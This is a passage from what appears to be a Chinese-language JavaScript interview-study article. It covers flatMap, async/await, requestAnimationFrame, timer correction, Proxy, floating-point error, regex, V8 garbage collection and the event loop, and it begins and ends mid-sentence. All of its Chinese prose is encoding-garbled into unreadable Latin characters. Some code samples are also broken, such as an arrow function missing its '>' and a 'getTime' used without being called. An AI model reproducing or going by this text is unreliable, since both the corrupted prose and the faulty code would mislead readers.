ä¹Žæ˜¯ç›¸åŒçš„ï¼Œä½†æ˜¯å¯¹äºŽå¤šç»´æ•°ç»„æ¥è¯´ï¼Œä¼šå°†åŽŸæ•°ç»„é™ç»´ã€‚å¯ä»¥å°† FlatMap çœ‹æˆæ˜¯ map + flatten ï¼Œç›®å‰è¯¥å‡½æ•°åœ¨æµè§ˆå™¨ä¸­è¿˜ä¸æ”¯æŒã€‚ 12[1,[2],3].flatMap(v=v+1);// [2,3,4] å¦‚æžœæƒ³å°†ä¸€ä¸ªå¤šç»´æ•°ç»„å½»åº•çš„é™ç»´ï¼Œå¯ä»¥è¿™æ ·å®žçŽ° 123const flattenDeep = arr =&gt; Array.isArray(arr) ? arr.reduce((a,b)=&gt;[...a,...flattenDeep(b)],[]):[arr];flattenDeep([1,[[2],[3,[4]],5]]);// [1,2,3,4,5] Reduce ä½œç”¨æ˜¯æ•°ç»„ä¸­çš„å€¼ç»„åˆèµ·æ¥ï¼Œæœ€ç»ˆå¾—åˆ°ä¸€ä¸ªå€¼ 1234567function a()&#123; console.log(1)&#125;function b()&#123; console.log(2);&#125;[a,b].reduce((a,b)=&gt;a(b())); async å’Œ awaitä¸€ä¸ªå‡½æ•°å¦‚æžœåŠ ä¸Š async,é‚£ä¹ˆè¯¥å‡½æ•°å°±ä¼šè¿”å›žä¸€ä¸ª Promise 1234async function test()&#123; return '1'&#125;console.log(test()); // -&gt; Promise &#123;&lt;resolved&gt;: "1"&#125; å¯ä»¥æŠŠ async çœ‹æˆå‡½æ•°è¿”å›žå€¼ä½¿ç”¨ Promise.resolve() åŒ…è£¹äº†ä¸‹ã€‚ await åªèƒ½åœ¨ async å‡½æ•°ä¸­ä½¿ç”¨ 12345678910111213function sleep()&#123; return new Promise(resolve=&gt;&#123; setTimeout(()=&gt;&#123; console.log('finish'); resolve('sleep'); &#125;,2000); &#125;);&#125;async function test()&#123; let value = await sleep(); console.log('object');&#125;test(); ä¸Šé¢ä»£ç ä¼šå…ˆæ‰“å° finish ç„¶åŽå†æ‰“å° object ã€‚å› ä¸º await ä¼šç­‰å¾… sleep å‡½æ•° resolve ï¼Œæ‰€ä»¥å³ä½¿åŽé¢æ˜¯åŒæ­¥ä»£ç ï¼Œä¹Ÿä¸ä¼šå…ˆåŽ»æ‰§è¡ŒåŒæ­¥ä»£ç å†æ¥æ‰§è¡Œå¼‚æ­¥ä»£ç ã€‚ async å’Œ await ç›¸æ¯”ç›´æŽ¥ä½¿ç”¨ Promise æ¥è¯´ï¼Œä¼˜åŠ¿åœ¨äºŽå¤„ç† then çš„è°ƒç”¨é“¾ï¼Œèƒ½å¤Ÿæ›´æ¸…æ™°å‡†ç¡®çš„å†™å‡ºä»£ç ã€‚ç¼ºç‚¹åœ¨äºŽæ»¥ç”¨ await å¯èƒ½ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜ï¼Œå› ä¸º await ä¼šé˜»å¡žä»£ç ï¼Œä¹Ÿè®¸ä¹‹åŽçš„å¼‚æ­¥ä»£ç å¹¶ä¸ä¾èµ–å‰è€…ï¼Œä½†ä»ç„¶éœ€è¦ç­‰å¾…å‰è€…å®Œæˆï¼Œå¯¼è‡´ä»£ç å¤±åŽ»äº†å¹¶å‘æ€§ã€‚ 1234567891011121314let a = 0;const b = async() =&gt;&#123; a = a + await 10; console.log('2',a); a = (await 10) + a; console.log('3',a);&#125;b();a++console.log('1',a);// VM3859:10 1 1// VM3859:4 2 10// VM3859:6 3 20 é¦–å…ˆå‡½æ•° b æ‰§è¡Œï¼Œåœ¨æ‰§è¡Œåˆ°äº† await 10 ä¹‹å‰ a çš„å˜é‡è¿˜æ˜¯ 0ï¼Œå› ä¸ºåœ¨ await å†…éƒ¨å®žçŽ°äº†generators ,generators ä¼šä¿ç•™å †æ ˆä¸­ä¸œè¥¿ï¼Œa=0 è¢«ä¿å­˜ä¸‹æ¥ã€‚ å› ä¸º await æ˜¯å¼‚æ­¥æ“ä½œï¼Œé‡åˆ° await ä¼šç«‹å³è¿”å›žä¸€ä¸ª pending çŠ¶æ€çš„ promise å¯¹è±¡ï¼Œæš‚æ—¶è¿”å›žæ‰§è¡Œä»£ç çš„æŽ§åˆ¶æƒï¼Œä½¿å¾—å‡½æ•°å¤–çš„ä»£ç å¾—ä»¥ç»§ç»­æ‰§è¡Œï¼Œæ‰€ä»¥ä¼šå…ˆæ‰§è¡Œ åŒæ­¥ä»£ç  console.log(â€˜1â€™,a); åŒæ­¥ä»£ç ä¹‹åŽå°±æ˜¯å¼‚æ­¥ä»£ç ï¼Œå°†ä¿å­˜ä¸‹æ¥çš„å€¼æ‹¿å‡ºæ¥ç”¨ï¼Œè¿™æ—¶å€™ a = 10 åŽé¢å°±æ˜¯å¸¸è§„çš„æ‰§è¡Œä»£ç äº† å¸¸ç”¨çš„å®šæ—¶å™¨å‡½æ•°ç›¸å…³é¢è¯•é¢˜ï¼šsetTimeoutã€setIntervalã€requestAnimationFrame å„æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿ requestAnimationFrameè¯·æ±‚åŠ¨ç”»å¸§ã€‚å±å¹•åˆ·æ–°é¢‘çŽ‡ï¼Œä¹Ÿå°±æ˜¯å±å¹•ä¸Šçš„å›¾åƒæ¯ç§’é’Ÿå‡ºçŽ°çš„æ¬¡æ•°ï¼Œå®ƒçš„å•ä½æ˜¯èµ«å…¹ï¼ˆHZï¼‰ã€‚å½“å¯¹ç€ç”µè„‘å±å¹•ä»€ä¹ˆä¹Ÿä¸åšçš„æƒ…å†µä¸‹ï¼Œæ˜¾ç¤ºå™¨ä¹Ÿä¼šä»¥æ¯ç§’60æ¬¡çš„é¢‘çŽ‡åœ¨ä¸æ–­æ›´æ–°å±å¹•ä¸Šçš„å›¾åƒã€‚æˆ‘ä»¬ä¹‹æ‰€ä»¥æ„Ÿè§‰ä¸åˆ°å˜åŒ–çš„åŽŸå› æ˜¯å› ä¸ºäººçš„çœ¼ç›æœ‰è§†è§‰åœç•™æ•ˆåº”ï¼Œç”»ä¹‹é—´é—´éš”æ—¶é—´åªæœ‰16.7msï¼ˆ1000/60)ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šè§‰å¾—å±å¹•ä¸Šçš„å›¾åƒæ˜¯é™æ­¢ä¸åŠ¨çš„ã€‚ åŠ¨ç”»çš„æœ¬è´¨å°±æ˜¯è¦è®©äººçœ¼çœ‹åˆ°å›¾åƒè¢«åˆ·æ–°è€Œå¼•èµ·çš„å˜åŒ–çš„è§†è§‰æ•ˆæžœï¼Œè¿™ä¸ªå˜åŒ–è¦ä»¥è¿žè´¯çš„å¹³æ»‘çš„æ–¹å¼è¿‡æ¸¡ã€‚ æˆ‘ä»¬åœ¨æ¯æ¬¡åˆ·æ–°å‰ï¼Œå°†å›¾åƒçš„ä½ç½®ç§»åŠ¨ä¸€ä¸ªåƒç´ ï¼Œè¿™æ ·ä¸€æ¥ï¼Œå±å¹•æ¯æ¬¡åˆ·æ–°å‡ºæ¥çš„å›¾åƒä½ç½®éƒ½æ¯”å‰ä¸€ä¸ªè¦å·®ä¸€ä¸ªåƒç´ ã€‚å› ä¸ºä½ ä¼šçœ‹åˆ°å›¾åƒåœ¨ç§»åŠ¨ï¼Œç”±äºŽäººçœ¼çš„è§†è§‰åœç•™æ•ˆåº”ï¼Œå½“å‰ä½ç½®çš„å›¾åƒåœç•™åœ¨å¤§è„‘çš„å½±å“è¿˜æ²¡æœ‰æ¶ˆå¤±ï¼Œç´§æŽ¥ç€å›¾åƒåˆè¢«ç§»åˆ°äº†ä¸‹ä¸€ä¸ªä½ç½®ï¼Œå› ä¸ºä½ ä¼šçœ‹åˆ°å›¾åƒåœ¨æµç•…åœ°ç§»åŠ¨ï¼Œè¿™å°±æ˜¯è§†è§‰æ•ˆæžœä¸Šå½¢æˆçš„åŠ¨ç”»ã€‚ requestAnimationFrameæœ€å¤§çš„ä¼˜åŠ¿å°±æ˜¯ç³»ç»Ÿå†³å®šçš„å›žè°ƒå‡½æ•°çš„æ‰§è¡Œæ—¶æœºï¼Œå¤§æ¦‚çš„æ„æ€å°±æ˜¯å›žè°ƒå‡½æ•°ä¼šéšç€å±å¹•åˆ·æ–°çš„é¢‘çŽ‡çš„å˜åŒ–è€Œäº§ç”Ÿå¯¹åº”çš„å˜åŒ–ã€‚å®ƒèƒ½ä¿è¯å›žè°ƒå‡½æ•°åœ¨å±å¹•æ¯ä¸€æ¬¡çš„åˆ·æ–°é—´éš”ä¸­åªæ‰§è¡Œä¸€æ¬¡ï¼Œè¿™æ ·å°±ä¸ä¼šå¼•èµ·ä¸¢å¸§çŽ°è±¡ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´åŠ¨ç”»å‡ºçŽ°å¡é¡¿çš„é—®é¢˜ã€‚ ç®€å•çš„è°ƒç”¨ 12345678910let progress = 0;function render()&#123; progress +=1; if(progress&lt;100)&#123; window.requestAnimationFrame(render) &#125;&#125;// ç¬¬ä¸€å¸§æ¸²æŸ“window.requestAnimationFrame(render); å¦å¤–å®ƒè¿˜æœ‰ä¸¤ä¸ªä¼˜åŠ¿ï¼š CpuèŠ‚èƒ½ï¼šä½¿ç”¨ setTimeout å®žçŽ°çš„åŠ¨ç”»ï¼Œå½“é¡µé¢è¢«éšè—åˆ°æœ€å°åŒ–æ—¶ï¼Œä»ç„¶ä¼šåœ¨åŽå°æ‰§è¡ŒåŠ¨ç”»äººç‰©ï¼Œç”±äºŽæ­¤æ—¶é¡µé¢å¤„äºŽä¸å¯è§æˆ–è€…ä¸å¯ç”¨çŠ¶æ€ï¼Œåˆ·æ–°ç”»é¢ä¹Ÿæ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œå®Œå…¨æ˜¯æµªè´¹èµ„æºã€‚è€Œ requestAnimationFrame åˆ™å®Œå…¨ä¸åŒï¼Œå½“é¡µé¢å¤„ç†æœªæ¿€æ´»çš„çŠ¶æ€ä¸‹ï¼Œè¯¥é¡µé¢çš„å±å¹•åˆ·æ–°äººç‰©ä¹Ÿä¼šè¢«ç³»ç»Ÿæš‚åœï¼Œæœ‰æ•ˆèŠ‚çœCPU å¼€é”€ å‡½æ•°èŠ‚æµï¼šåœ¨é«˜é¢‘çŽ‡ï¼ˆresize,scrollï¼‰ä¸­å—ï¼Œä¸ºäº†é˜²æ­¢åœ¨ä¸€ä¸ªåˆ·æ–°é—´éš”å†…å‘ç”Ÿå¤šå‡ºå‡½æ•°æ‰§è¡Œï¼Œä½¿ç”¨ requestAnimationFrame å¯ä»¥ä¿è¯æ¯ä¸ªåˆ·æ–°çš„é—´éš”å†…ï¼Œå‡½æ•°åªè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œè¿™æ ·æ—¢å¯ä»¥ä¿è¯æµç•…æ€§ï¼Œä¹Ÿèƒ½æ›´å¥½çš„èŠ‚çœå‡½æ•°æ‰§è¡Œçš„å¼€é”€ã€‚ä¸€ä¸ªåˆ·æ–°é—´éš”å†…å‡½æ•°æ‰§è¡Œå¤šæ¬¡æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œå› ä¸ºæ˜¾ç¤ºå™¨åˆ·æ–°çš„é¢‘çŽ‡æ˜¯ä¸€å®šçš„ï¼Œå¤šæ¬¡ç»˜åˆ¶ä¸ä¼šåœ¨å±å¹•ä¸Šä½“çŽ°å‡ºæ¥ã€‚ ç”±äºŽæµè§ˆå™¨å…¼å®¹é—®é¢˜ï¼Œéœ€è¦ä¼˜é›…é™çº§åšå…¼å®¹ï¼Œå…·ä½“ä»£ç ,æ‘˜è‡ª requestAnimationFrameï¼š 123456789101112131415161718192021222324if (!Date.now) &#123; Date.now = function () &#123; return new Date().getTime(); &#125;&#125;(function () &#123; var vendors = ['webkit', 'moz']; for (var i = 0; i &lt; vendors.length &amp;&amp; !window.requestAnimationFrame; i++) &#123; var vp = vendors[i]; window.requestAnimationFrame = window[vp + 'RequestAnimationFrame']; window.cancelAnimationFrame = window[vp + 'CancelAnimationFrame'] || window[vp + 'CancelRequestAnimationFrame']; if (/iP(ad|hone|od).*OS 6/.test(window.navigator.userAgent) || !window.requestAnimationFrame || !window.cancelAnimationFrame) &#123; var lastTime = 0; window.requestAnimationFrame = function (cb) &#123; var now = Date.now(); var nextTime = Math.max(lastTime + 16, now); return setTimeout(function () &#123; cb(lastTime = nextTime) &#125;, nextTime - now) &#125; window.cancelAnimationFrame = clearTimeout; &#125; &#125;&#125;)() setTimeoutè®¾ç½®æŸä¸ªæ—¶é—´åŽæ‰§è¡ŒæŸä¸ªåŠ¨ä½œï¼Œè¡¨ç¤ºå»¶æ—¶æ‰§è¡ŒæŸä¸ªåŠ¨ä½œ setIntervalè®¾ç½®æ¯éš”å¤šä¹…æ‰§è¡ŒæŸä¸ªåŠ¨ä½œï¼Œå¾ªçŽ¯çš„ã€‚setInterval å°†æ³¨å†Œå‡½æ•°æ¤å…¥ Event Queue,å¦‚æžœå‰é¢çš„ä»»åŠ¡è€—èƒ½å¤ªä¹…ï¼Œé‚£ä¹ˆå°±éœ€è¦ç­‰å¾…ã€‚ å› ä¸ºJS å•çº¿ç¨‹çš„é—®é¢˜ï¼ŒsetTimeout å¯èƒ½ä¸ä¼šæŒ‰æœŸæ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡ä»£ç åŽ»ä¿®æ­£ setTimeout ï¼Œä»Žè€Œä½¿å®šæ—¶å™¨ç›¸å¯¹å‡†ç¡® 12345678910111213141516171819202122232425let period = 60 * 1000 * 60 * 2;let startTime = new Date().getTime();let count = 0;let end = new Date().getTime + period;let interval = 1000;let currentInterval = interval;function loop() &#123; count++; // ä»£ç æ‰§è¡Œæ‰€æ¶ˆè€—çš„æ—¶é—´ let offset = new Date().getTime() - (startTime + count * interval); let diff = end - new Date().getTime(); let h = Math.floor(diff / (60 * 1000 * 60)) let hdiff = diff % (60 * 1000 * 60); let m = Math.floor(hdiff / (60 * 1000)); let mdiff = hdiff % (60 * 1000); let s = mdiff / (1000); let sCeil = Math.ceil(s); let sFloor = Math.floor(s); // å¾—å‡ºä¸‹ä¸€æ¬¡å¾ªçŽ¯æ‰€æ¶ˆè€—çš„æ—¶é—´ currentInterval = interval - offset; setTimeout(loop, currentInterval); console.log('æ—¶ï¼š' + h, 'åˆ†ï¼š' + m, 'æ¯«ç§’ï¼š' + s, 'ç§’å‘ä¸Šå–æ•´ï¼š' + sCeil, 'ä»£ç æ‰§è¡Œæ—¶é—´ï¼š' + offset, 'ä¸‹æ¬¡å¾ªçŽ¯é—´éš”' + currentInterval)&#125;setTimeout(loop, currentInterval) ProxyProxy æ˜¯ ES6 ä¸­æ–°å¢žçš„åŠŸèƒ½ï¼Œå¯ä»¥ç”¨æ¥è‡ªå®šä¹‰å¯¹è±¡ä¸­çš„æ“ä½œ 12345678910111213141516171819202122232425262728let p = new Proxy(target,handler)// target ä»£è¡¨éœ€è¦æ·»åŠ ä»£ç†çš„å¯¹è±¡// Handler ç”¨æ¥è‡ªå®šä¹‰å¯¹è±¡ä¸­çš„æ“ä½œ// å¯ä»¥å¾ˆæ–¹ä¾¿ä½¿ç”¨ Proxy æ¥å®žçŽ°ä¸€ä¸ªæ•°æ®çš„ç»‘å®šå’Œç›‘å¬let onWatch = (obj,setBind,getLogger)=&gt;&#123; let handler = &#123; get(target,property,receiver)&#123; getLogger(target,property) return Reflect.get(target,property,receiver); &#125;, set(target,property,value,receiver)&#123; setBind(value); return Reflect.set(target,property,value); &#125; &#125;; return new Proxy(obj,handler);&#125;let obj = &#123; a: 1 &#125;;let value;let pw = onWatch(obj,(v)=&gt;&#123; value = v&#125;,(target,property)=&gt;&#123; console.log(`Get $&#123;property&#125; = $&#123;target[property]&#125;`);&#125;)pw.a = 2; // bind value to 2pw.a // get a = 2 ä¸ºä»€ä¹ˆ 0.1 + 0.2 != 0.3å› ä¸º JS é‡‡ç”¨ IEEE 754 åŒç²¾åº¦ç‰ˆæœ¬ï¼ˆ64ä½ï¼‰,å¹¶ä¸”åªè¦é‡‡ç”¨ IEEE 754 çš„è¯­è¨€éƒ½æœ‰è¯¥é—®é¢˜ åŽŸç”Ÿè§£å†³æ–¹æ³•ï¼š 1parseFloat((0.1+0.2).toFixed(10)) æ­£åˆ™è¡¨è¾¾å¼å…ƒå­—ç¬¦ å…ƒå­—ç¬¦ ä½œç”¨ . åŒ¹é…ä»»æ„å­—ç¬¦é™¤äº†æ¢è¡Œç¬¦å’Œå›žè½¦ç¬¦ [] åŒ¹é…æ–¹æ‹¬å·å†…çš„ä»»æ„å­—ç¬¦ã€‚æ¯”å¦‚ [0-9] å°±å¯ä»¥ç”¨æ¥åŒ¹é…ä»»æ„æ•°å­— ^ ^9 è¿™æ ·ä½¿ç”¨åŒ¹é…ä»¥ 9 å¼€å¤´ï¼Œ[^9] è¿™æ ·ä½¿ç”¨ä»£è¡¨ä¸åŒ¹é…æ–¹æ‹¬å·å†…é™¤äº†9çš„å­—ç¬¦ {1,2} åŒ¹é…1åˆ°2ä½å­—ç¬¦ (yck) åªåŒ¹é… yck ç›¸åŒå­—ç¬¦ä¸² \ åŒ¹é… \ å‰åŽä»»æ„å­—ç¬¦ \ è½¬ä¹‰ * åªåŒ¹é…å‡ºçŽ°0æ¬¡åŠä»¥ä¸Š *å‰çš„å­—ç¬¦ + åªåŒ¹é…å‡ºçŽ°1æ¬¡åŠä»¥ä¸Š +å‰çš„å­—ç¬¦ ? ï¼Ÿ ä¹‹å‰å­—ç¬¦å¯é€‰ ä¿®é¥°ç¬¦ ä¿®é¥°è¯­ ä½œç”¨ i å¿½ç•¥å¤§å°å†™ g å…¨å±€æœç´¢ m å¤šè¡Œ å­—ç¬¦ç®€å†™ ç®€å†™ ä½œç”¨ \w åŒ¹é…å­—æ¯æ•°å­—æˆ–ä¸‹åˆ’çº¿ \W ä¸Žä¸Šé¢ç›¸å \s åŒ¹é…ä»»æ„çš„ç©ºç™½ç¬¦ \S ä¸Žä¸Šé¢ç›¸å \d åŒ¹é…æ•°å­— \D ä¸Žä¸Šé¢ç›¸å \b åŒ¹é…å•è¯çš„å¼€å§‹æˆ–ç»“æŸ \B ä¸Žä¸Šé¢ç›¸å V8ä¸‹çš„åžƒåœ¾å›žæ”¶æœºåˆ¶V8 å®žçŽ°äº†å‡†ç¡®å¼ GCï¼ŒGC ç®—æ³•é‡‡ç”¨äº†åˆ†ä»£å¼åžƒåœ¾å›žæ”¶æœºåˆ¶ã€‚å› æ­¤ï¼ŒV8 å°†å†…å­˜ï¼ˆå †ï¼‰åˆ†ä¸ºäº†æ–°ç”Ÿä»£å’Œè€ç”Ÿä»£ä¸¤éƒ¨åˆ† æ–°ç”Ÿä»£ç®—æ³•æ–°ç”Ÿä»£ä¸­çš„å¯¹è±¡ä¸€èˆ¬å­˜æ´»æ—¶é—´è¾ƒçŸ­ï¼Œä½¿ç”¨ Scavenge GC ç®—æ³•ã€‚ åœ¨æ–°ç”Ÿä»£ç©ºé—´ä¸­ï¼Œå†…å­˜ç©ºé—´åˆ†ä¸ºäº†ä¸¤éƒ¨åˆ†ï¼Œåˆ†åˆ«ä¸º From ç©ºé—´å’Œ To ç©ºé—´ã€‚åœ¨è¿™ä¸¤ä¸ªç©ºé—´ä¸­ï¼Œå¿…å®šæœ‰ä¸€ä¸ªç©ºé—´æ˜¯ä½¿ç”¨çš„ï¼Œå¦ä¸€ä¸ªç©ºé—´æ˜¯ç©ºé—²çš„ã€‚æ–°åˆ†é…çš„å¯¹è±¡ä¼šè¢«æ”¾å…¥ From ç©ºé—´ä¸­ï¼Œå½“ From ç©ºé—´è¢«å æ»¡çš„æ—¶å€™ï¼Œæ–°ç”Ÿä»£ GC å°±ä¼šå¯åŠ¨äº†ã€‚ç®—æ³•ä¼šæ£€æŸ¥ From ç©ºé—´ä¸­å­˜æ´»çš„å¯¹è±¡å¹¶å¤åˆ¶åˆ° To ç©ºé—´ä¸­ï¼Œå¦‚æžœæœ‰å¤±æ´»çš„å¯¹è±¡å°±ä¼šé”€æ¯ã€‚å½“å¤åˆ¶å®Œæˆå°† From ç©ºé—´å’Œ To ç©ºé—´äº’æ¢ï¼Œè¿™æ · GC å°±ç»“æŸäº†ã€‚ è€ç”Ÿä»£ç®—æ³•è€ç”Ÿä»£ä¸­çš„å¯¹è±¡ä¸€èˆ¬å­˜æ´»æ—¶é—´è¾ƒé•¿ä¸”æ•°é‡ä¹Ÿå¤šï¼Œä½¿ç”¨äº†ä¸¤ä¸ªç®—æ³•ï¼Œåˆ†åˆ«æ˜¯æ ‡è®°æ¸…é™¤ç®—æ³•å’Œæ ‡è®°åŽ‹ç¼©ç®—æ³•ã€‚ ä»€ä¹ˆæƒ…å†µä¸‹å¯¹è±¡ä¼šå‡ºçŽ°åœ¨è€ç”Ÿä»£ç©ºé—´ä¸­ï¼š æ–°ç”Ÿä»£ä¸­çš„å¯¹è±¡æ˜¯å¦å·²ç»ç»åŽ†è¿‡ä¸€æ¬¡ Scavenge ç®—æ³•ï¼Œå¦‚æžœç»åŽ†è¿‡çš„è¯ï¼Œä¼šå°†å¯¹è±¡ä»Žæ–°ç”Ÿä»£ç©ºé—´ç§»åˆ°è€ç”Ÿä»£ç©ºé—´ä¸­ã€‚ To ç©ºé—´çš„å¯¹è±¡å æ¯”å¤§å°è¶…è¿‡ 25 %ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸ºäº†ä¸å½±å“åˆ°å†…å­˜åˆ†é…ï¼Œä¼šå°†å¯¹è±¡ä»Žæ–°ç”Ÿä»£ç©ºé—´ç§»åˆ°è€ç”Ÿä»£ç©ºé—´ä¸­ è€ç”Ÿä»£ä¸­çš„ç©ºé—´å¾ˆå¤æ‚ï¼Œæœ‰å¦‚ä¸‹å‡ ä¸ªç©ºé—´ 123456789101112131415enum AllocationSpace &#123; // TODO(v8:7464): Actually map this space's memory as read-only. RO_SPACE, // ä¸å˜çš„å¯¹è±¡ç©ºé—´ NEW_SPACE, // æ–°ç”Ÿä»£ç”¨äºŽ GC å¤åˆ¶ç®—æ³•çš„ç©ºé—´ OLD_SPACE, // è€ç”Ÿä»£å¸¸é©»å¯¹è±¡ç©ºé—´ CODE_SPACE, // è€ç”Ÿä»£ä»£ç å¯¹è±¡ç©ºé—´ MAP_SPACE, // è€ç”Ÿä»£ map å¯¹è±¡ LO_SPACE, // è€ç”Ÿä»£å¤§ç©ºé—´å¯¹è±¡ NEW_LO_SPACE, // æ–°ç”Ÿä»£å¤§ç©ºé—´å¯¹è±¡ FIRST_SPACE = RO_SPACE, LAST_SPACE = NEW_LO_SPACE, FIRST_GROWABLE_PAGED_SPACE = OLD_SPACE, LAST_GROWABLE_PAGED_SPACE = MAP_SPACE&#125;; åœ¨è€ç”Ÿä»£ä¸­ï¼Œä»¥ä¸‹æƒ…å†µä¼šå…ˆå¯åŠ¨æ ‡è®°æ¸…é™¤ç®—æ³•ï¼š æŸä¸€ä¸ªç©ºé—´æ²¡æœ‰åˆ†å—çš„æ—¶å€™ ç©ºé—´ä¸­è¢«å¯¹è±¡è¶…è¿‡ä¸€å®šé™åˆ¶ ç©ºé—´ä¸èƒ½ä¿è¯æ–°ç”Ÿä»£ä¸­çš„å¯¹è±¡ç§»åŠ¨åˆ°è€ç”Ÿä»£ä¸­ åœ¨è¿™ä¸ªé˜¶æ®µä¸­ï¼Œä¼šéåŽ†å †ä¸­æ‰€æœ‰çš„å¯¹è±¡ï¼Œç„¶åŽæ ‡è®°æ´»çš„å¯¹è±¡ï¼Œåœ¨æ ‡è®°å®ŒæˆåŽï¼Œé”€æ¯æ‰€æœ‰æ²¡æœ‰è¢«æ ‡è®°çš„å¯¹è±¡ã€‚åœ¨æ ‡è®°å¤§åž‹å¯¹å†…å­˜æ—¶ï¼Œå¯èƒ½éœ€è¦å‡ ç™¾æ¯«ç§’æ‰èƒ½å®Œæˆä¸€æ¬¡æ ‡è®°ã€‚è¿™å°±ä¼šå¯¼è‡´ä¸€äº›æ€§èƒ½ä¸Šçš„é—®é¢˜ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œ2011 å¹´ï¼ŒV8 ä»Ž stop-the-world æ ‡è®°åˆ‡æ¢åˆ°å¢žé‡æ ‡å¿—ã€‚åœ¨å¢žé‡æ ‡è®°æœŸé—´ï¼ŒGC å°†æ ‡è®°å·¥ä½œåˆ†è§£ä¸ºæ›´å°çš„æ¨¡å—ï¼Œå¯ä»¥è®© JS åº”ç”¨é€»è¾‘åœ¨æ¨¡å—é—´éš™æ‰§è¡Œä¸€ä¼šï¼Œä»Žè€Œä¸è‡³äºŽè®©åº”ç”¨å‡ºçŽ°åœé¡¿æƒ…å†µã€‚ä½†åœ¨ 2018 å¹´ï¼ŒGC æŠ€æœ¯åˆæœ‰äº†ä¸€ä¸ªé‡å¤§çªç ´ï¼Œè¿™é¡¹æŠ€æœ¯åä¸ºå¹¶å‘æ ‡è®°ã€‚è¯¥æŠ€æœ¯å¯ä»¥è®© GC æ‰«æå’Œæ ‡è®°å¯¹è±¡æ—¶ï¼ŒåŒæ—¶å…è®¸ JS è¿è¡Œï¼Œä½ å¯ä»¥ç‚¹å‡» è¯¥åšå®¢ è¯¦ç»†é˜…è¯»ã€‚ æ¸…é™¤å¯¹è±¡åŽä¼šé€ æˆå †å†…å­˜å‡ºçŽ°ç¢Žç‰‡çš„æƒ…å†µï¼Œå½“ç¢Žç‰‡è¶…è¿‡ä¸€å®šé™åˆ¶åŽä¼šå¯åŠ¨åŽ‹ç¼©ç®—æ³•ã€‚åœ¨åŽ‹ç¼©è¿‡ç¨‹ä¸­ï¼Œå°†æ´»çš„å¯¹è±¡åƒä¸€ç«¯ç§»åŠ¨ï¼Œç›´åˆ°æ‰€æœ‰å¯¹è±¡éƒ½ç§»åŠ¨å®Œæˆç„¶åŽæ¸…ç†æŽ‰ä¸éœ€è¦çš„å†…å­˜ã€‚ Event Loopè¿›ç¨‹å’Œçº¿ç¨‹ä¸¤ä¸ªåè¯éƒ½æ˜¯ CPU å·¥ä½œæ—¶é—´ç‰‡çš„ä¸€ä¸ªæè¿°ã€‚ è¿›ç¨‹æè¿°äº† CPU åœ¨è¿è¡ŒæŒ‡ä»¤ä»¥åŠè®°è½½å’Œä¿å­˜ä¸Šä¸‹æ–‡æ‰€éœ€çš„æ—¶é—´ï¼Œæ”¾åœ¨åº”ç”¨ä¸Šæ¥è¯´å°±ä»£è¡¨äº†ä¸€ä¸ªç¨‹åºã€‚ çº¿ç¨‹æ˜¯è¿›ç¨‹ä¸­æ›´å°çš„å•ä½ï¼Œæè¿°äº†ä¸€æ®µæŒ‡ä»¤æ‰€éœ€è¦çš„æ—¶é—´ã€‚ åœ¨æµè§ˆå™¨ä¸­ï¼Œæ‰“å¼€ä¸€ä¸ª Tab é¡µé¢ï¼Œå°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªè¿›ç¨‹é‡Œé¢å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œä¾‹å¦‚æ¸²æŸ“çº¿ç¨‹ï¼ŒJS å¼•æ“Žçº¿ç¨‹ï¼ŒHTTP è¯·æ±‚çº¿ç¨‹ã€‚å½“å‘èµ·ä¸€ä¸ªè¯·æ±‚æ—¶ï¼Œå°±æ˜¯åœ¨åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œå½“è¯·æ±‚ç»“æŸçš„æ—¶å€™ï¼Œè¯¥çº¿ç¨‹å°±å¯èƒ½ä¼šè¢«é”€æ¯æŽ‰ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼ŒJS è¿è¡Œæ—¶ä¼šé˜»æ­¢ UI æ¸²æŸ“ï¼Œè¿™ä¸¤ä¸ªçº¿ç¨‹æ˜¯äº’æ–¥çš„ï¼Œå› ä¸º JS å¯ä»¥ä¿®æ”¹ Dom ï¼Œå¦‚æžœåœ¨ JS æ‰§è¡Œçš„æ—¶å€™ Ui çº¿ç¨‹è¿˜åœ¨å·¥ä½œï¼Œå°±å¯èƒ½ä¼šå¯¼è‡´ä¸èƒ½æ­£å¸¸å®‰å…¨æ¸²æŸ“ UIã€‚è¿™ä¹Ÿæ˜¯å•çº¿ç¨‹çš„ä¸€ä¸ªå¥½å¤„ï¼Œå¾—ç›ŠäºŽ JS æ˜¯å•çº¿ç¨‹ä¸Žå¾ˆåƒçš„ï¼Œå¯ä»¥è¾¾åˆ°èŠ‚çœå‘¢æ¬§æ‘ï¼ŒèŠ‚çº¦ä¸Šä¸‹æ–‡åˆ‡æ¢æ—¶é—´ï¼Œæ²¡æœ‰é”çš„é—®é¢˜çš„å¥½å¤„ã€‚ æ‰§è¡Œæ ˆå¯ä»¥æŠŠæ‰§è¡Œæ ˆè®¤ä¸ºæ˜¯ä¸€ä¸ªå­˜å‚¨å‡½æ•°è°ƒç”¨çš„æ ˆç»“æž„ï¼Œéµå¾ªå…ˆè¿›åŽå‡ºçš„åŽŸåˆ™ æµè§ˆå™¨ä¸­çš„ Event Loopå½“é‡åˆ°å¼‚æ­¥ä»£ç çš„æ—¶å€™ï¼Œä¼šè¢«æŒ‚èµ·å¹¶åœ¨éœ€è¦æ‰§è¡Œçš„æ—¶å€™åŠ å…¥åˆ° Task é˜Ÿåˆ—ä¸­ã€‚ä¸€æ—¦æ‰§è¡Œæ ˆä¸ºç©ºï¼ŒEvent Loop å°±ä¼šä»Ž Task é˜Ÿåˆ—ä¸­æ‹¿å‡ºéœ€è¦ä½ æ‰§è¡Œçš„ä»£ç å¹¶æ”¾å…¥æ‰§è¡Œæ ˆä¸­æ‰§è¡Œï¼Œæ‰€ä»¥æœ¬è´¨ä¸Š JS 